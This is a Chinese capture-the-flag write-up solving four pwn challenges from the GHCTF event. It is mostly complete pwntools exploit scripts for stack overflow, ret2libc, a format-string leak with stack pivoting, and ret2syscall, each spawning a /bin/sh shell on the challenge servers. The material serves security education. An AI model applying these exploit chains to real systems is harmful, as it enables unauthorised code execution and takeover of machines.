# NSSCTF赛事GHCTF部分题解-先知社区

> **来源**: https://xz.aliyun.com/news/17109  
> **文章ID**: 17109

---

## pwn

### Hello\_world

![屏幕截图 2025-03-02 232133.png](images/f101483d-c38c-39cc-a834-b800bf9a701a)

栈溢出漏洞有后门，但是开启了pie保护

gdb调试发现

![屏幕截图 2025-03-02 232415.png](images/9afcd84e-9829-32ba-9494-1f88796a70ef)

直接修改返回地址尾字节即可

```
pay=b'a'*0x28+b'\xc1'
s(pay)
```

![ad7a160280b08f14cf7c7e77c41fa096.png](images/e1d26248-e86f-379f-a106-48cdd6e48038)

### ret2libc1

![屏幕截图 2025-03-02 232645.png](images/2383d7cd-faf6-3f2f-bb88-6023a1f0938f)

shop函数存在栈溢出漏洞，但我们只有1000money

![image.png](images/773504fb-1fd9-3001-b492-891d3e85f204)

想要利用栈溢出漏洞就需要去赚钱

继续看代码发现选项7是赚钱的，see\_it函数

![5626843a6e0bceb2f40b978b12fb2180.png](images/c3071aac-64ed-343d-8dc1-a07b501e2142)

我们利用选项7将我们的money增加到200000以上，就可以利用两次栈溢出漏洞，从而打ret2libc

```
for i in range(9):
    rl("6.check youer money")
    s(str(7))
    rl("How much do you exchange?")
    s(str(10000))
```

![屏幕截图 2025-03-02 233640.png](images/79ea08a3-09aa-3565-8aa3-5e93dcf32989)

```
from pwn import*
from struct import pack
from ctypes import *
context(log_level = 'debug',arch = 'amd64')
#p=process('./attachment')
p=remote('node2.anna.nssctf.cn',28334)
elf=ELF('./attachment')
libc=ELF('./libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def pr(a):
	print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
	return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
for i in range(9):
    rl("6.check youer money")
    s(str(7))
    rl("How much do you exchange?")
    s(str(10000))
rl("6.check youer money")
s(str(5))
rdi=0x0000000000400d73
pay=b'a'*0x48+p64(rdi)+p64(elf.got['read'])+p64(elf.plt['puts'])+p64(0x400b1e)
s(pay)
libc_base=get_addr64()-libc.sym['read']
li(hex(libc_base))
system,bin=get_sb()
pay=b'a'*0x48+p64(rdi)+p64(bin)+p64(rdi+1)+p64(system)
s(pay)
inter()
```

getshell

![f2d55044c3fe54f5abf5cc4363e68f41.png](images/f0c066a8-142f-39d8-b72f-87265f918d91)

### ret2libc2

![image.png](images/1629c505-f9b7-3025-9d20-ab0acce65a83)

程序中没有rdi寄存器，没有办法直接rop链泄露libc地址，但是这里是有printf函数的，并且是存在格式化漏洞的，我们可以将返回地址写成printf，从而达到利用格式化漏洞的效果

![image.png](images/dc8d28e5-23d6-3caa-99e4-ee88b4765571)

![image.png](images/91c2297e-4c72-361e-a0ed-a988623ea8b4)

将rax设置为%7$p,随后返回printf就会赋值给rdi，从而泄露出栈上的相关内容

![image.png](images/09a6a9b9-b1a2-326b-a6d4-78802031227a)

接下来进行第二次read，我们发现读入地址依旧是与rax有关系，那么我们就需要在泄露完libc之后再次控制rax

这里lea rax, [rbp - 0x30]

我们如果能把rbp的值给覆盖成有效地址，那么第二次读入就可以正常进行了，这么我们将读入地址设置为bss段，进行栈迁移执行rop链即可。

```
from pwn import*
from struct import pack
from ctypes import *
context(log_level = 'debug',arch = 'amd64')
p=process('./ret2libc2')
#p=remote('node2.anna.nssctf.cn',28658)
elf=ELF('./ret2libc2')
#libc=ELF('./libc.so.6')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def pr(a):
	print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
	return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
printf=0x401227
bss=0x404060+0x800
payload=b"%7$p\x00\x00\x00\x00"*0x6+p64(bss)+p64(printf)
bug()
s(payload)
rl(b"show your magic
")
libc_base = int(p.recv(14), 16) - 171408
li(hex(libc_base))
system, bin = get_sb()
rdi=0x000000000002a3e5+libc_base
leave=0x401272
pay=(b'a'*0x8+p64(rdi)+p64(bin)+p64(rdi+1)+p64(system)).ljust(0x30,b'\x00')+p64(bss-0x30)+p64(leave)
s(pay)
inter()

```

![732ac22101765b00045eb781e2e02d00.png](images/4c65b867-0da7-3f26-85a0-ad5912195546)

### 真会布置栈吗？

ret2syscall

刚开始会给我们栈地址，我们发现并没有/bin/sh字符串的地址，那么我们就可以将字符串写到栈上

![image.png](images/3ff09b0d-1bf5-3c81-a3b7-6779ff1b6363)

![image.png](images/85cffd02-ef0a-3abe-ac63-614197752b2f)利用这几段gadget去控制我们的寄存器即可

不难，但是有点绕吧

```
from pwn import*
from struct import pack
import ctypes
context(log_level = 'debug',arch = 'amd64')
#p=process('./attachment')
p=remote('node2.anna.nssctf.cn',28375)
elf=ELF('./attachment')
#libc=ELF('/root/glibc-all-in-one/libs/2.38-1ubuntu6.3_i386/libc.so.6')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
def bug():
	gdb.attach(p)
	pause()
def s(a):
	p.send(a)
def sa(a,b):
	p.sendafter(a,b)
def sl(a):
	p.sendline(a)
def sla(a,b):
	p.sendlineafter(a,b)
def r(a):
	p.recv(a)
def pr(a):
	print(p.recv(a))
def rl(a):
	return p.recvuntil(a)
def inter():
	p.interactive()
def get_addr64():
	return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
	return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
	return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
rsp=get_addr64()
stack=rsp-24
li(hex(stack))
syscall = 0x40100A
ret = 0x401013
payload = p64(ret)
payload += p64(elf.sym["gadgets"])#pop   rsi;pop   rdi; pop   rbx;pop   r13;pop   r15;jmp   r15
payload += p64(0)
payload += p64(stack+0x50)
payload += p64(stack+0x30)
payload += p64(0x3b)
payload += p64(elf.sym["dispatcher"])#add rbx,8 ;jmp   qword ptr [rbx]
payload += p64(0x401021)#xor     rdx, rdx;jmp r15
payload += p64(0x40100c)#xchg    rax, r13
payload += p64(syscall)
payload += b"/bin/sh\x00"
#bug()
s(payload)
#p64(rax)+p64(0x3b)+p64(rdi)+p64(bin_sh)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall)

inter()

```

![f482c2cf240dfb47f363b3dc17b04441.png](images/139c6842-8d7a-3241-94b7-d68c0f2833d8)
